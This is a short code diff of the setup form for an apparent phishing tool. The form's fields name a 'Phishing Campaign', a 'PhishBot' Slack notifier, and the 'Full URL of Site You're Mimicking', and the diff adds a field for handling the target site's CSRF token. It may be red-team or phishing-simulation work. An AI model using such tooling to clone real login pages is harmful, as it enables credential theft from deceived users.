@@ -49,7 +49,8 @@ if(!isset($_REQUEST['APIURL'])){
 <TR><TH COLSPAN="2">Specifiy API Details for Form Submission</TH></TR>
 <TR><TD>API URL: </TD><TD><INPUT TYPE="text" NAME="APIURL" VALUE="https://<?php echo $_SERVER['SERVER_NAME'];?>" PLACEHOLDER="This API URL" SIZE="40"></TD></TR>
 <TR><TD>Project Name: </TD><TD><INPUT TYPE="text" NAME="Project" VALUE="" PLACEHOLDER="Project Name / Org / Phishing Campaign" SIZE="40"></TD></TR>
-<TR><TD>Redirect URL: </TD><TD><INPUT TYPE="text" NAME="Redirect" VALUE="https://" PLACEHOLDER="Redirect Location Post Login" SIZE="40"></TD></TR>
+<TR><TD>Source URL: </TD><TD><INPUT TYPE="text" NAME="Redirect" VALUE="https://" PLACEHOLDER="Full URL of Site You're Mimicking" SIZE="40"></TD></TR>
+<TR><TD>CSRF Token: </TD><TD><INPUT TYPE="text" NAME="csrffield" VALUE="csrf_token" PLACEHOLDER="Enter Element Name/ID if Target Has CSRF" SIZE="40"></TD></TR>
 <TR><TD>Slack Bot Name: </TD><TD><INPUT TYPE="text" NAME="SlackBotName" VALUE="PhishBot" PLACEHOLDER="Slack Bot Name" SIZE="40"></TD></TR>
 <TR><TD>Slack Bot Logo: </TD><TD><INPUT TYPE="text" NAME="SlackEmoji" VALUE=":fishing_pole_and_fish:" PLACEHOLDER="Slack Bot Logo" SIZE="40"></TD></TR>
 <TR><TD>Website Logo URL: </TD><TD><INPUT TYPE="text" NAME="ImageLogo" VALUE="" PLACEHOLDER="Use HTTPS to Avoid Mixed Content" SIZE="40"></TD></TR>
